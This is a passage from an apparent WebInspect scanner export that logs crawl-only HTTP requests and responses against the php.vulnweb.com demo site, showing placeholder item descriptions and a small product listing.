/></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<items><item name="infotitle" id="1">The shore</item><item name="infotitle" id="2">Mistery</item><item name="infotitle" id="3">The universe</item><item name="infotitle" id="4">Walking</item><item name="infotitle" id="5">Mean</item><item name="infotitle" id="6">Thing</item><item name="infotitle" id="7">Trees</item></items>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:36 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/xml;charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>323</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="CD6AE2AAEA951B3E1FA12B842A3E9C59"><URL>http://php.vulnweb.com:80/AJAX/infotitle.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="CD6AE2AAEA951B3E1FA12B842A3E9C59"><![CDATA[POST /AJAX/infotitle.php HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/x-www-form-urlencoded
Content-Length: 4
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="CD6AE2AAEA951B3E1FA12B842A3E9C59";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="1c260788";
X-Request-Memo: ID="af57aaee";sc="1";tid="54";
Cookie: CustomCookie=WebInspect0

id=1]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:36 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/xml;charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 912

<iteminfo><name>The shore</name><description>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu.</description><description>&lt;p&gt;
This picture is an 53 cm x 12 cm masterpiece.
&lt;/p&gt;
&lt;p&gt;
This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. 
&lt;/p&gt;</description><description>price: 500</description><picture>./pictures/1.jpg</picture></iteminfo>]]></RawResponse><Request id="CD6AE2AAEA951B3E1FA12B842A3E9C59"><Method>POST</Method><Path>/AJAX/</Path><File>infotitle</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>id=1</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/index.php</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>content-type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>4</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="CD6AE2AAEA951B3E1FA12B842A3E9C59";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="1c260788";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="af57aaee";sc="1";tid="54";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<iteminfo><name>The shore</name><description>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu.</description><description>&lt;p&gt;
This picture is an 53 cm x 12 cm masterpiece.
&lt;/p&gt;
&lt;p&gt;
This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. 
&lt;/p&gt;</description><description>price: 500</description><picture>./pictures/1.jpg</picture></iteminfo>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:36 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/xml;charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>912</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="2D546954C520A6E3B89341554B8331D5"><URL>http://php.vulnweb.com:80/privacy.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="2D546954C520A6E3B89341554B8331D5"><![CDATA[GET /privacy.php HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="2D546954C520A6E3B89341554B8331D5";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="c362730f";
X-Request-Memo: ID="1ff99ccf";sc="1";tid="36";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 404 Not Found
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:37 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 16

File not found.
]]></RawResponse><Request id="2D546954C520A6E3B89341554B8331D5"><Method>GET</Method><Path>/</Path><File>privacy</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="2D546954C520A6E3B89341554B8331D5";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="c362730f";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="1ff99ccf";sc="1";tid="36";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>404</StatusCode><StatusDescription>Not Found</StatusDescription><SetCookie /><ResponseBody><![CDATA[File not found.
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:37 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>16</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="C3545265C5A6628761695123C37F0502"><URL>http://php.vulnweb.com:80/AJAX/infotitle.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="C3545265C5A6628761695123C37F0502"><![CDATA[POST /AJAX/infotitle.php HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/x-www-form-urlencoded
Content-Length: 4
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="C3545265C5A6628761695123C37F0502";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="b3209b4b";
X-Request-Memo: ID="b2d0eae2";sc="1";tid="54";
Cookie: CustomCookie=WebInspect0

id=2]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:37 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/xml;charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 852

<iteminfo><name>Mistery</name><description>Donec molestie.
Sed aliquam sem ut arcu.</description><description>&lt;p&gt;
This picture is an 53 cm x 12 cm masterpiece.
&lt;/p&gt;
&lt;p&gt;
This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. 
&lt;/p&gt;</description><description>price: 800</description><picture>./pictures/2.jpg</picture></iteminfo>]]></RawResponse><Request id="C3545265C5A6628761695123C37F0502"><Method>POST</Method><Path>/AJAX/</Path><File>infotitle</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>id=2</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/index.php</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>content-type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>4</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="C3545265C5A6628761695123C37F0502";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="b3209b4b";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="b2d0eae2";sc="1";tid="54";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<iteminfo><name>Mistery</name><description>Donec molestie.
Sed aliquam sem ut arcu.</description><description>&lt;p&gt;
This picture is an 53 cm x 12 cm masterpiece.
&lt;/p&gt;
&lt;p&gt;
This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. 
&lt;/p&gt;</description><description>price: 800</description><picture>./pictures/2.jpg</picture></iteminfo>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:37 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/xml;charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>852</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="6A3E6B22313623A0E6D1F5887F392849"><URL>http://php.vulnweb.com:80/Mod_Rewrite_Shop/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="6A3E6B22313623A0E6D1F5887F392849"><![CDATA[GET /Mod_Rewrite_Shop/ HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="6A3E6B22313623A0E6D1F5887F392849";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="67839ec1";
X-Request-Memo: ID="bbd61aea";sc="1";tid="36";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:37 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 975

<html>
<div id="content">
	<div class='product'><table><tr><td width='180px'><img src='images/1.jpg'></td><td width='400px'><a href='Details/network-attached-storage-dlink/1/'>Network Storage D-Link DNS-313 enclosure 1 x SATA</a></td><td width='50px' bgcolor='#F8F8F8'><a href='Details/network-attached-storage-dlink/1/'>Price<br>359 &euro;</a></td></table></tr></div><div class='product'><table><tr><td width='180px'><img src='images/2.jpg'></td><td width='400px'><a href='Details/web-camera-a4tech/2/'>Web Camera A4Tech PK-335E</a></td><td width='50px' bgcolor='#F8F8F8'><a href='Details/web-camera-a4tech/2/'>Price<br>10 &euro;</a></td></table></tr></div><div class='product'><table><tr><td width='180px'><img src='images/3.jpg'></td><td width='400px'><a href='Details/color-printer/3/'>Laser Color Printer HP LaserJet M551dn, A4</a></td><td width='50px' bgcolor='#F8F8F8'><a href='Details/color-printer/3/'>Price<br>812 &euro;</a></td></table></tr></div></div>
</html>]]></RawResponse><Request id="6A3E6B22313623A0E6D1F5887F392849"><Method>GET</Method><Path>/Mod_Rewrite_Shop/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="6A3E6B22313623A0E6D1F5887F392849";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="67839ec1";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="bbd61aea";sc="1";tid="36";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<html>
<div id="content">
	<div class='product'><table><tr><td width='180px'><img src='images/1.jpg'></td><td width='400px'><a href='Details/network-attached-storage-dlink/1/'>Network Storage D-Link DNS-313 enclosure 1 x SATA</a></td><td width='50px' bgcolor='#F8F8F8'><a href='Details/network-attached-storage-dlink/1/'>Price<br>359 &euro;</a></td></table></tr></div><div class='product'><table><tr><td width='180px'><img src='images/2.jpg'></td><td width='400px'><a href='Details/web-camera-a4tech/2/'>Web Camera A4Tech PK-335E</a></td><td width='50px' bgcolor='#F8F8F8'><a href='Details/web-camera-a4tech/2/'>Price<br>10 &euro;</a></td></table></tr></div><div class='product'><table><tr><td width='180px'><img src='images/3.jpg'></td><td width='400px'><a href='Details/color-printer/3/'>Laser Color Printer HP LaserJet M551dn, A4</a></td><td width='50px' bgcolor='#F8F8F8'><a href='Details/color-printer/3/'>Price<br>812 &euro;</a></td></table></tr></div></div>
</html>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:37 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>975</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="855E6D4F3ABE01265C16F28DB515C68A"><URL>http://php.vulnweb.com:80/AJAX/infotitle.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="855E6D4F3ABE01265C16F28DB515C68A"><![CDATA[POST /AJAX/infotitle.php HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/x-www-form-urlencoded
Content-Length: 4
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="855E6D4F3ABE01265C16F28DB515C68A";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="eebb8430";
X-Request-Memo: ID="74c030f7";sc="1";tid="54";
Cookie: CustomCookie=WebInspect0

id=3]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:38 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/xml;charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 885

<iteminfo><name>The universe</name><description>Lorem ipsum dolor sit amet. Donec molestie.
Sed aliquam sem ut arcu.</description><description>&lt;p&gt;
This picture is an 53 cm x 12 cm masterpiece.
&lt;/p&gt;
&lt;p&gt;
This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. 
&lt;/p&gt;</description><description>price: 986</description><picture>./pictures/3.jpg</picture></iteminfo>]]></RawResponse><Request id="855E6D4F3ABE01265C16F28DB515C68A"><Method>POST</Method><Path>/AJAX/</Path><File>infotitle</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>id=3</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/index.php</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>content-type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>4</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="855E6D4F3ABE01265C16F28DB515C68A";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="eebb8430";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="74c030f7";sc="1";tid="54";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<iteminfo><name>The universe</name><description>Lorem ipsum dolor sit amet. Donec molestie.
Sed aliquam sem ut arcu.</description><description>&lt;p&gt;
This picture is an 53 cm x 12 cm masterpiece.
&lt;/p&gt;
&lt;p&gt;
This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. 
&lt;/p&gt;</description><description>price: 986</description><picture>./pictures/3.jpg</picture></iteminfo>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:38 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/xml;charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>885</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="F88DED6D35677120BD908F83E52CA16A"><URL>http://php.vulnweb.com:80/AJAX/infotitle.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="F88DED6D35677120BD908F83E52CA16A"><![CDATA[POST /AJAX/infotitle.php HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/x-www-form-urlencoded
Content-Length: 4
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="F88DED6D35677120BD908F83E52CA16A";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="15d42428";
X-Request-Memo: ID="30879002";sc="1";tid="54";
Cookie: CustomCookie=WebInspect0

id=4]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:38 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/xml;charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 936

<iteminfo><name>Walking</name><description>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin.
</description><description>&lt;p&gt;
This picture is an 53 cm x 12 cm masterpiece.
&lt;/p&gt;
&lt;p&gt;
